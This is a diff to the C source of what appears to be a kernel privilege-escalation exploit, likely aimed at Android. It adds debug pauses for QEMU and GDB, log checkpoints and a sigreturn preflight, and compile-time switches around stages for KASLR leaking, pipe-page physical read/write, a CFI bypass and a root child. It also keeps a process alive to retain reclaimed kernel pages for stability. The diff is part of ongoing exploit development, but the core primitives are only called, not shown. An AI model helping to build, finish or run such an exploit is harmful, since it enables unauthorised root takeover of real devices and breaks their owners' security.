@@ -1,5 +1,6 @@
 #include "common.h"
 
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 uint32_t f_wait;
 uint32_t f_pi_target;
 uint32_t f_pi_chain;
@@ -14,10 +15,27 @@ atomic_int punch_consume_stop;
 atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int main_route_delay_usec;
+#endif
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+static void durable_log_checkpoint(const char *stage) {
+  struct stat st;
+  pr_info("durable log checkpoint stage=%s\n", stage);
+  SYSCHK(fflush(NULL));
+  SYSCHK(fstat(STDOUT_FILENO, &st));
+  if (!S_ISREG(st.st_mode)) {
+    pr_warning("durable log checkpoint skipped stage=%s mode=%#o\n",
+               stage, st.st_mode);
+    return;
+  }
+  SYSCHK(fsync(STDOUT_FILENO));
+}
+#endif
+
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -172,6 +190,7 @@ void run_main_route_threads(void) {
     usleep(10000);
   }
 }
+#endif
 
 static pid_t spawn_allocation_keeper(void) {
   pid_t child = SYSCHK(fork());
@@ -415,6 +434,14 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+  if (!slide_sigreturn_preflight()) {
+    pr_error("slide sigreturn preflight failed\n");
+    return 1;
+  }
+#endif
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
@@ -457,6 +484,7 @@ int run_exploit(int argc, char **argv) {
   }
   pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
 #else
+#if !defined(APP_FOPS_BEFORE_PIPE) || !APP_FOPS_BEFORE_PIPE
   pipebuf_page_base = prepare_pipe_buffer_page();
   pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
   if (!is_direct_ptr(pipebuf_page_base)) {
@@ -465,11 +493,24 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 #endif
+#endif
 
   pin_to_core(CORE);
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+#endif
+
+#ifdef QEMU_FOPS_GDB_HOLD_SECONDS
+  pr_info("qemu fops gdb hold seconds=%d base=%016zx\n",
+          QEMU_FOPS_GDB_HOLD_SECONDS, page_base);
+  sleep(QEMU_FOPS_GDB_HOLD_SECONDS);
+#endif
+
+#ifdef QEMU_GDB_HOLD_SECONDS
+  pr_info("qemu gdb hold seconds=%d base=%016zx\n",
+          QEMU_GDB_HOLD_SECONDS, page_base);
+  sleep(QEMU_GDB_HOLD_SECONDS);
 #endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
@@ -507,6 +548,7 @@ int run_exploit(int argc, char **argv) {
           APP_FOPS_PSELECT_DELAY_USEC);
   return 1;
 #else
+  durable_log_checkpoint("fops-page-held");
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
     APP_FOPS_REUSE_VERIFIED_PAGE
@@ -610,11 +652,15 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
+#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
+  int exploit_ok = atomic_load(&cfi_stage_done);
+#else
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
+#endif
   return exploit_ok ? 0 : 1;
 }
